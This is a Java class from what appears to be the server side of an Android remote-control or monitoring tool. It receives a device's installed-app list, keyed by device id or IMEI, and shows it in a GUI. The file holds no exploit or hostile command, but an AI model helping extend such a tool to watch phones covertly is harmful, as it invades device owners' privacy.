package com.android.security.handler;

import com.android.security.gui.GUI;
import com.android.security.gui.server.Server;
import com.android.security.packages.APPListPacket;
import com.android.security.packages.Packet;

public class APPListHandler implements PacketHandler {
	private GUI gui;
	private String id;
	private int channel;

	public APPListHandler(int channel, String id, GUI mainUI) {
		this.gui = mainUI;
		this.id = id;
		this.channel = channel;
	}

	@Override
	public void receive(Packet p, String imei) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void handlePacket(Packet packet, String id, Server server) {
		// TODO Auto-generated method stub	
		this.gui.logTxt("应用列表数据已收到");
		server.getChannelHandlerMap().get(id).removeListener(this.channel);
		APPListPacket appListPacket = (APPListPacket) packet;
		this.gui.updateAPPList(id, appListPacket.getList());
	}
}